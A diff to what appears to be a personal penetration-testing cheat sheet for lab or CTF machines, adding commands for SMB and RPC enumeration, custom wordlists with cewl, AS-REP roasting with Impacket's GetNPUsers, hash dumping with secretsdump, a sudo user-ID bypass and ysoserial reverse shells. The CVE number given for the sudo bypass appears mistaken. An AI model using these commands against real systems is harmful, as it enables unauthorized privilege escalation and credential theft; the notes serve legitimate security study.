@@ -12,7 +12,25 @@
 9. Always check `cat ~/.*history | less` or just `history`
 10. Use ysoserial to exploit java deserialization to get revershell or RCE (payload have to be in a file). Then use it or encode it first, what ever.
 11. Remember CVE-2019-13287 (ALL, !root) /bin/bash >>> sudo -u#-1 /bin/bash
-12. `.conf` file may contain something.
+12. `.conf` file may contain something. (usually in /etc/apache2)
+13. Stuck? Bruteforce with no end? Generate your own wordlist with cewl! Example: cewl http://10.10.10.191/ -w customwordlist.txt -m 6
+14. 
+- SMB enum >>> smbclient -L //[IP], and continue with the shares name  smbclient //[IP]/[sharename]
+- smbclient //[IP]/[sharename] --user=[username] --workgroup=[forest name] 
+16. rpcclient --user=[username] [target-ip] -W [forest name]
+
+**Impacket**
+1. GetNPUsers.py >> This script can check of the usernames are existing and if they have Kerberos pre-authentication enabled
+
+Usage: `python3 ~/scripts/impacket/examples/GetNPUsers.py [Forest]/ -usersfile [List of username file] -outputfile hash.txt -dc-ip [TARGET IP] -format john` >> format john so then u can crack the existing user hash
+
+2. secretsdump.py >> Performs various techniques to dump hashes from the remote machine without executing any agent there. (SAMHashes, LSASecrets, NTDSHashes)
+
+Example: 
+`python3 ~/scripts/impacket/examples/secretsdump.py -ntds ntds.dit -system system.bak LOCAL`
+`~/scripts/impacket/examples/secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>`
+and many more.. go research on it.
+
 
 **PATH Privesc**
 ### When it is not run directly, example:
